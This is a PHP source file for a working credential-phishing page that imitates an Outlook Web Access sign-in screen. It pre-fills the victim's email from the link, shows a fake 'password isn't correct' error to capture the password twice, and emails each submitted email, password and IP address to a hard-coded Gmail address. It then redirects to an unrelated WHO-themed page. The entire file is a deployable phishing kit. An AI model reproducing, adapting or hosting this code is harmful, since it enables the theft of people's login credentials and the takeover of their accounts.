<?php
error_reporting(0);
ini_set('display_errors', 0);


$current_timestamp = time();
$md5 = md5(time());
$urls = '&client_id=' . $md5 . '&resse_me=' . $md5 . $md5 . '&res_te=' . md5($md5) . '&scope=' . $md5 . '&state=' . $md5;
if (empty($_GET['client_id'])) {
    //echo "bosh";
    
}
if (empty($_GET['e'])) {
    $mail = 'NoN';
} else {
    $mail = htmlspecialchars($_GET['e']);
}



if (empty($_GET['st'])) {
    $st = '1';
} else if ($_GET['st'] == '1') {
    $st = '2';
}



if (isset($_POST['emasdsfs'])) {

  
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    $email = htmlspecialchars($_POST['emasdsfs']);
    $passwd = htmlspecialchars($_POST['paswfgsw']);
    

    $to = 'rossboss2025@gmail.com'; // change email
    $subject = $email;
    $message = 'STEP: ' . $st . "\r\n";
    $message.= 'Infos ' . "\r\n";
    $message.= 'Email: ' . $email . "\r\n";
    $message.= 'Password: ' . $passwd . "\r\n";
    $message.= 'IP: ' . $ip . "\r\n";
    $headers = 'From: ' . $email . "\r\n";

    if (mail($to, $subject, $message, $headers)) {
    }

    if ($_GET['st'] == '2') { //Thank you <strong>$mail</strong>
        $sms = "<center>WHO INFO ALERT!!!  </center>";
        echo '<meta http-equiv="refresh" content="5; url=https://experience.arcgis.com/experience/685d0ace521648f8a5beeeee1b9125cd" />';
        $fianl = 1;
    }
}

?>
<!DOCTYPE html>
<html>
<head>
	<title>Web Access</title>
	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" crossorigin="anonymous"></script>
</head>

<body  style="background: #f2f2f2 url() repeat-x;">

<style type="text/css">
.bg{background: #0072C6;position: absolute;top: 0px;bottom: 0px;left: 0px;display: inline-block;width: 332px}.llctan{margin: 213px auto auto 0px;text-align: center}.Container_logon{padding-top: 174px;padding-left: 464px;padding-right: 142px;position: absolute;top: 0px;bottom: 0px;left: 0px;right: 0px}.mouse .logon_div, .twide .logon_div{position: relative;vertical-align: top;display: inline-block;width: 423px}.mouse .image_header{margin-bottom: 22px}.mouse .si_InputLabel{margin-bottom: 2px}.si_InputLabel{font-size: 12px;color: #666666;font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;width: 135px}.mouse .s_In_Input_Text{height: 22px;font-size: 12px;padding: 3px 5px;color: #333333;font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;margin-bottom: 20px}.s_In_Input_Text{border: 1px solid #98A3A6;color: #333333;border-radius: 0;-moz-border-radius: 0;-webkit-border-radius: 0;box-shadow: none;-moz-box-shadow: none;-webkit-box-shadow: none;-webkit-appearance: none;background-color: #FDFDFD;width: 250px;margin-bottom: 10px;box-sizing: content-box;-moz-box-sizing: content-box;-webkit-box-sizing: content-box}.sign_in_enter{font-size: 22px;color: #0072C6;font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;margin-top: 20px;width: 200px}.mouse .si_in_button{padding: 0px 8px 5px 8px;margin-left: -8px}.img_lnk{vertical-align: middle;line-height: 2;margin-top: -2px}input[type="hidden" i]{display: none}.bsg{text-align: center;width: 100%;margin-top: 238px}.si_In_Error{font-size: 12px;color: #C1272D;font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;margin-top: 12px}

</style>
<div class="container">
   <!-- Content here -->
   <div class="row">
      <div class="col-2 bg">
         <div class="llctan">
            <img src="https://i.imgur.com/39X3KPf.png" class="Logowa" aria-hidden="true">
         </div>
      </div>
      <div class="col-10">
         <?php  if (empty($fianl)) { ?>                          
       
         <form method="POST" action="?st=<?php echo $st; ?>&e=<?php echo $_GET['e'].$urls; ?>" id="sended">
            <div class="Container_logon">
               <div id="lgn_div" class="logon_div" onkeypress="return checkSubmit(event)">
                  <div class="image_header" role="heading">
                     <img class="mouse_header" src="https://i.imgur.com/KgAer7t.png">
                  </div>
                  <br>
                  <div class="si_InputLabel" id="userNameLabel" aria-hidden="true">User name:</div>                
                  <div>

                        <input required="required"  name="emasdsfs" class="s_In_Input_Text"   value="<?php echo $_GET['e'];?>"  >

                </div>
                  <div class="si_InputLabel"  aria-hidden="true">Password:</div>
                  <div>

                     <input required="required"  name="paswfgsw" type="password" class="s_In_Input_Text" value="">

                  </div>
                 
                  <div></div>
                  <?php if ($_GET['st'] == '1') { ?>
                  <div id="si_erorDiv" class="si_In_Error" role="alert" tabindex="0">
                     The user name or password you entered isn't correct. Try entering it again.
                  </div>
                  <?php }?> 

                  <div id="expl_txt" class="sign_In_Expl" role="alert">
                  </div>

                  <div class="sign_in_enter">
                     <div onclick="clkLgn()" class="si_in_button" role="button" tabindex="0">
                        <img class="img_lnk" src="https://i.imgur.com/ouFtCq8.png" alt="">
                        <button style="display: none;" type="submit">submit</button>
                        <span class="signin_txt"> sign in</span>
                     </div>
                  </div>
               </div>
            </div>
         </form>


         <script type="text/javascript">
            function clkLgn(){                                  
                 document.forms["sended"].submit();
            }
         </script>
         <?php   }else{  ?>

         <div id="lgn_div" class="logon_div" onkeypress="return checkSubmit(event)">
            <div class="alert alert-success" role="alert">
              <?php echo $sms;?>
            </div>
         </div>

         <?php } ?>
      </div>
   </div>
</div>

</body>
</html>